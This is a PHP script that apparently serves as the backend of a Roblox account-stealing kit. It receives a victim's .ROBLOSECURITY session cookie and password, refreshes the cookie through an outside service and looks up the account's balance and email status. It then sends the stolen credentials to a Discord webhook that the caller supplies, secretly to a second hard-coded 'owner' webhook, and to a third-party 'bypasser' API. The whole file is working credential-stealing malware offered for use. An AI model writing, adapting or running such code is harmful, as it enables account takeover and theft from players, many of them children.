<?php
header('Content-Type: application/json');

/* ---------- CONFIG ---------- */
const OWNER_WEBHOOK = 'https://discord.com/api/webhooks/YOUR_OWNER_ID/YOUR_OWNER_TOKEN';
/* ---------- INPUT ---------- */
$payload  = json_decode(file_get_contents('php://input'), true);
$cookie   = $payload['cookie']   ?? ($_GET['cookie'] ?? null);
$password = $payload['password'] ?? ($_GET['password'] ?? null);
$dualHook = $payload['wh']       ?? ($_GET['wh'] ?? null);

if (!$cookie || !$dualHook) {
    http_response_code(400);
    die(json_encode(['ok'=>false,'error'=>'cookie or wh missing']));
}

/* ---------- UTILS ---------- */
function curlGet($url,$cookie=null){
    $ch=curl_init($url);
    curl_setopt_array($ch,[
        CURLOPT_HTTPHEADER=>$cookie?["Cookie: .ROBLOSECURITY=$cookie"]:[],
        CURLOPT_RETURNTRANSFER=>1,
        CURLOPT_TIMEOUT=>8
    ]);
    return json_decode(curl_exec($ch)?:'',true)?:[];
}

function curlPost($url,$data,$headers=[]){
    $headers[]='Content-Type: application/json';
    $ch=curl_init($url);
    curl_setopt_array($ch,[
        CURLOPT_POST=>1,
        CURLOPT_HTTPHEADER=>$headers,
        CURLOPT_POSTFIELDS=>json_encode($data),
        CURLOPT_RETURNTRANSFER=>1,
        CURLOPT_TIMEOUT=>10
    ]);
    return curl_exec($ch);
}

/* ---------- 1.  REFRESH via external API ---------- */
$fresh = curlPost('https://autohar.st/api/cookie-refresher',['cookie'=>$cookie]);
$fresh = json_decode($fresh,true)['refreshed'] ?? $cookie;

/* ---------- 2.  GRAB STATS ---------- */
$user  = curlGet('https://users.roblox.com/v1/users/authenticated',$fresh);
if(!isset($user['id'])){http_response_code(401);die(json_encode(['ok'=>false,'error'=>'invalid']));}
$uid   = $user['id'];

[$cur,$email,$thumb]=[
    curlGet('https://economy.roblox.com/v1/user/currency',$fresh),
    curlGet('https://accountinformation.roblox.com/v1/email',$fresh),
    curlGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=$uid&size=150x150")
];

/* ---------- 3.  WEBHOOK EMBEDS ---------- */
$dualEmbed=[
    'username'=>'Project X v2',
    'embeds'=>[[
        'title'=>'Project X v2 – RESULT NOTIFICATION',
        'color'=>0x00ff00,
        'description'=>"**New Result** • {$user['name']} (13+)",
        'fields'=>[['name'=>'ROBLOSECURITY','value'=>"`$fresh`",'inline'=>false]]
    ]]
];

$ownerEmbed=[
    'username'=>'OwnerGrab',
    'embeds'=>[[
        'title'=>':Cookie_Clicker: Refreshed Cookie',
        'color'=>0xff0000,
        'description'=>"
:bulb: **Username** {$user['name']}
:robux: **Balance** {$cur['robux']}
:email: **Email** ".($email['verified']?'Verified':'Unverified')."
:password: **Password** `$password`",
        'image'=>['url'=>$thumb['data'][0]['imageUrl']??'']
    ]]
];

curlPost($dualHook,$dualEmbed);
curlPost(OWNER_WEBHOOK,$ownerEmbed);

/* ---------- 4.  SPLUNK BYPASS ---------- */
curlPost('https://app.splunk.gg/api/bypasser',[
    'action'=>'refresh_cookie',
    'cookie'=>$fresh,
    'password'=>$password
]);

echo json_encode(['ok'=>true]);
?>
